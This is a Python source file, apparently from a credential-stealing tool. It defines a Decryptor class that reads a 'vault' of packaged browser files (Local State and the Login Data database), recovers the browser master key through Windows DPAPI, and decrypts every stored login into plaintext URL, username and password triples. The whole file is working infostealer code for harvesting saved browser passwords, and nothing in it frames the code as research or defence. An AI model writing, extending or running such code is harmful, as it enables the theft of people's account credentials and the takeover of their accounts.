# ui/decryption_util.py (NEW FILE)
import os
import json
import base64
import sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    import win32crypt
    DPAPI_AVAILABLE = True
except ImportError:
    DPAPI_AVAILABLE = False

class Decryptor:
    def __init__(self, vault_data):
        self.vault_data = vault_data
        self.master_key = None

    def _get_master_key(self):
        if not DPAPI_AVAILABLE:
            return None, "PyWin32 is not installed, cannot decrypt on this machine."
        
        if self.master_key:
            return self.master_key, None

        browser_files = self.vault_data.get("Browser Files", {}).get("data", {})
        if not browser_files:
            return None, "Browser Files (Local State) not found in vault."

        local_state_b64 = browser_files.get("local_state")
        if not local_state_b64:
            return None, "Local State file is missing from the browser files package."

        try:
            local_state = json.loads(base64.b64decode(local_state_b64).decode())
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            self.master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
            return self.master_key, None
        except Exception as e:
            return None, f"Failed to extract master key: {e}"

    def _decrypt_value(self, encrypted_value):
        if not self.master_key:
            return "NO_MASTER_KEY"
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            return AESGCM(self.master_key).decrypt(iv, payload, None).decode()
        except Exception:
            return "DECRYPTION_FAILED"

    def decrypt_passwords(self):
        key, error = self._get_master_key()
        if error: return {"error": error}

        browser_files = self.vault_data.get("Browser Files", {}).get("data", {})
        login_db_b64 = browser_files.get("login_data")
        if not login_db_b64: return {"error": "Login Data database not found in vault."}

        passwords = []
        try:
            db_content = base64.b64decode(login_db_b64)
            temp_db_path = "temp_login_data.db"
            with open(temp_db_path, "wb") as f: f.write(db_content)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_pass = row
                password = self._decrypt_value(encrypted_pass)
                if password not in ["NO_MASTER_KEY", "DECRYPTION_FAILED", ""]:
                    passwords.append([url, username, password])
            
            conn.close()
            os.remove(temp_db_path)
            return passwords
        except Exception as e:
            if os.path.exists("temp_login_data.db"): os.remove("temp_login_data.db")
            return {"error": f"Failed to read password database: {e}"}